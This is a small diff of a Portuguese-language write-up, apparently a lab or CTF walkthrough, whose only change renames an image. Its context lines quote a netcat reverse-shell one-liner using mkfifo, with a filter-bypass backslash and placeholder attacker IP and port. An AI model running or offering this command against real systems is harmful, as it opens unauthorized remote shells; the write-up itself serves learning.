@@ -76,7 +76,7 @@ Buscando como podemos criar um shell reverso a partir disto, temos o seguinte tr
 > ```bash
 > r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip_address] [port] >/tmp/f
 > ```
-![](bypass.jpg)
+![](bypass1.jpg)
 
 Isso claro, requer a troca do endereço IP e a porta, além de termos o netcat na nossa máquina atacante
 
